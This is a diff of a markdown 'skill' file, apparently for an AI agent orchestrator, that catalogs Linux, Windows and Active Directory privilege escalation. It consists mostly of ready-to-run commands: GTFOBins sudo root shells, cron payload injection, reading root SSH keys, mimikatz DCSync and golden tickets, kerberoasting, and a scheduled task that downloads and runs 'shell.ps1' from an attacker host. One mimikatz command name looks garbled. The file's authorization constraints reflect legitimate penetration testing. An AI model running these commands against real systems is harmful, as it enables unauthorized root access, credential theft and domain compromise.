@@ -8,7 +8,6 @@ id: skill-privilege-escalation-methods
 owner: [[orchestrator]]
 ---
 
-
 # Privilege Escalation Methods
 
 ## Purpose
@@ -41,10 +40,13 @@ Provide comprehensive techniques for escalating privileges from a low-privileged
 Exploit misconfigured sudo permissions using GTFOBins techniques:
 
 ```bash
+
 # Check sudo permissions
+
 sudo -l
 
 # Exploit common binaries
+
 sudo vim -c ':!/bin/bash'
 sudo find /etc/passwd -exec /bin/bash \;
 sudo awk 'BEGIN {system("/bin/bash")}'
@@ -58,31 +60,40 @@ sudo env /bin/bash
 #### 2. Abusing Scheduled Tasks (Cron)
 
 ```bash
+
 # Find writable cron scripts
+
 ls -la /etc/cron*
 cat /etc/crontab
 
 # Inject payload into writable script
+
 echo 'chmod +s /bin/bash' > /home/user/systemupdate.sh
 chmod +x /home/user/systemupdate.sh
 
 # Wait for execution, then:
+
 /bin/bash -p
 ```
 
 #### 3. Abusing Capabilities
 
 ```bash
+
 # Find binaries with capabilities
+
 getcap -r / 2>/dev/null
 
 # Python with cap_setuid
+
 /usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 
 # Perl with cap_setuid
+
 /usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
 
 # Tar with cap_dac_read_search (read any file)
+
 /usr/bin/tar -cvf key.tar /root/.ssh/id_rsa
 /usr/bin/tar -xvf key.tar
 ```
@@ -90,10 +101,13 @@ getcap -r / 2>/dev/null
 #### 4. NFS Root Squashing
 
 ```bash
+
 # Check for NFS shares
+
 showmount -e <victim_ip>
 
 # Mount and exploit no_root_squash
+
 mkdir /tmp/mount
 mount -o rw,vers=2 <victim_ip>:/tmp /tmp/mount
 cd /tmp/mount
@@ -104,7 +118,9 @@ chmod +s bash
 #### 5. MySQL Running as Root
 
 ```bash
+
 # If MySQL runs as root
+
 mysql -u root -p
 \! chmod +s /bin/bash
 exit
@@ -118,17 +134,22 @@ exit
 #### 1. Token Impersonation
 
 ```powershell
+
 # Using SweetPotato (SeImpersonatePrivilege)
+
 execute-assembly sweetpotato.exe -p beacon.exe
 
 # Using SharpImpersonation
+
 SharpImpersonation.exe user:<user> technique:ImpersonateLoggedOnuser
 ```
 
 #### 2. Service Abuse
 
 ```powershell
+
 # Using PowerUp
+
 . .\PowerUp.ps1
 Invoke-ServiceAbuse -Name 'vds' -UserName 'domain\user1'
 Invoke-ServiceAbuse -Name 'browser' -UserName 'domain\user1'
@@ -145,7 +166,9 @@ Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\temp\ntds.dit
 #### 4. Abusing SeLoadDriverPrivilege
 
 ```powershell
+
 # Load vulnerable Capcom driver
+
 .\eoploaddriver.exe System\CurrentControlSet\MyService C:\test\capcom.sys
 .\ExploitCapcom.exe
 ```
@@ -166,10 +189,13 @@ Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\temp\ntds.dit
 #### 1. Kerberoasting
 
 ```bash
+
 # Using Impacket
+
 GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.100 -request
 
 # Using CrackMapExec
+
 crackmapexec ldap 10.0.2.11 -u 'user' -p 'pass' --kdcHost 10.0.2.11 --kerberoast output.txt
 ```
 
@@ -182,10 +208,13 @@ crackmapexec ldap 10.0.2.11 -u 'user' -p 'pass' --kdcHost 10.0.2.11 --kerberoast
 #### 3. Golden Ticket
 
 ```powershell
+
 # DCSync to get krbtgt hash
+
 mimikatz# lsadump::dcsync /user:krbtgt
 
 # Create golden ticket
+
 mimikatz# kerberos::golden /user:Administrator /domain:domain.local `
   /sid:S-1-5-21-... /rc4:<NTLM_HASH> /id:500
 ```
@@ -200,16 +229,20 @@ klist  # Verify ticket
 #### 5. Golden Ticket with Scheduled Tasks
 
 ```powershell
+
 # 1. Elevate and dump credentials
+
 mimikatz# token::elevate
 mimikatz# ecosistema::cred /patch
 mimikatz# lsadump::lsa /patch
 
 # 2. Create golden ticket
+
 mimikatz# kerberos::golden /user:Administrator /rc4:<HASH> `
   /domain:DOMAIN /sid:<SID> /ticket:ticket.kirbi
 
 # 3. Create scheduled task
+
 schtasks /create /S DOMAIN /SC Weekly /RU "NT Authority\SYSTEM" `
   /TN "enterprise" /TR "powershell.exe -c 'iex (iwr http://attacker/shell.ps1)'"
 schtasks /run /s DOMAIN /TN "enterprise"
@@ -222,10 +255,13 @@ schtasks /run /s DOMAIN /TN "enterprise"
 #### LLMNR Poisoning
 
 ```bash
+
 # Start Responder
+
 responder -I eth1 -v
 
 # Create malicious shortcut (Book.url)
+
 [InternetShortcut]
 URL=https://facebook.com
 IconIndex=0
@@ -271,16 +307,19 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYS
 ## Constraints
 
 **Must:**
+
 - Have initial shell access before attempting escalation
 - Verify target OS and environment before selecting technique
 - Use appropriate tool for domain vs local escalation
 
 **Must Not:**
+
 - Attempt techniques on production systems without authorization
 - Leave persistence mechanisms without client approval
 - Ignore detection mechanisms (EDR, SIEM)
 
 **Should:**
+
 - Enumerate thoroughly before exploitation
 - Document all successful escalation paths
 - Clean up artifacts after engagement
@@ -292,12 +331,15 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYS
 ### Example 1: Linux Sudo to Root
 
 ```bash
+
 # Check sudo permissions
+
 $ sudo -l
 User www-data may run the following commands:
     (root) NOPASSWD: /usr/bin/vim
 
 # Exploit vim
+
 $ sudo vim -c ':!/bin/bash'
 root@target:~# id
 uid=0(root) gid=0(root) groups=0(root)
@@ -306,10 +348,13 @@ uid=0(root) gid=0(root) groups=0(root)
 ### Example 2: Windows Kerberoasting
 
 ```bash
+
 # Request service tickets
+
 $ GetUserSPNs.py domain.local/jsmith:Password123 -dc-ip 10.10.10.1 -request
 
 # Crack with hashcat
+
 $ hashcat -m 13100 hashes.txt rockyou.txt
 ```
 
@@ -330,15 +375,18 @@ $ hashcat -m 13100 hashes.txt rockyou.txt
 ## Additional Resources
 
 For detailed enumeration scripts, use:
+
 - **LinPEAS**: Linux privilege escalation enumeration
 - **WinPEAS**: Windows privilege escalation enumeration
 - **BloodHound**: Active Directory attack path mapping
 - **GTFOBins**: Unix binary exploitation reference
 
 ## When to Use
+
 This skill is applicable to execute the workflow or actions described in the overview.
 
 ## Sentinel Security Policy
+
 - This asset is under Sognatore Sentinel supervision.
 - Extraction of secrets via this skill is strictly forbidden.
 - All external network calls must be audited by the security engine.
